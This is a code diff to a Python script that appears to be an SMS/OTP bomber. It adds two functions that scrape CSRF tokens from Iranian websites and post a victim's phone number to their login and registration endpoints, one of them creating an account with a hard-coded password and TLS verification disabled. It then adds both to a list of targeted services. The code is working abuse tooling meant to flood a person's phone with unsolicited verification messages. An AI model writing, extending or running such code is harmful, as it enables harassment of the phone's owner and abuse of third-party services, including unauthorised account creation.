@@ -176,11 +176,40 @@ def padmira(phone):
     except Exception as e: return {"error": str(e)}
 
 
+def bornosmode(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    s = requests.Session()
+    try:
+        res = s.get("https://bornosmode.com/", timeout=10)
+        token = BeautifulSoup(res.text, "html.parser").find("meta", {"name": "csrf-token"}).get("content")
+        r = s.post("https://bornosmode.com/api/loginRegister/", data={"mobile": phone, "withOtp": "1"}, headers={"X-CSRF-TOKEN": token, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
+        return r.json() if r.headers.get('Content-Type', '').startswith('application/json') else r.text
+    except Exception as e:
+        return f"Error: {e}"
+
+
+def chapmatin(phone):
+    phone = phone.replace('+98', '')
+    try:
+        s = requests.Session()
+        r = s.get("https://www.chapmatin.com/", timeout=10, verify=False)
+        token = BeautifulSoup(r.text, "html.parser").find("input", {"name": "dig_nounce"}).get("value")
+        data = {'action': 'digits_check_mob', 'countrycode': '+98', 'mobileNo': phone, 'csrf': token, 'login': '2', 'digits': '1', 'json': '1', 'whatsapp': '0', 'digregcode': '+98', 'digits_reg_mail': phone, 'digits_reg_password': 'admin123Mm@0091!', 'dig_nounce': token}
+        res = s.post("https://www.chapmatin.com/wp-admin/admin-ajax.php", data=data, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10, verify=False)
+        out = res.json()
+        print(f"Result: {out}")
+        return str(out.get("code")) == "1" or out.get("success")
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+
+
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin
 ]
 
 # ==========================
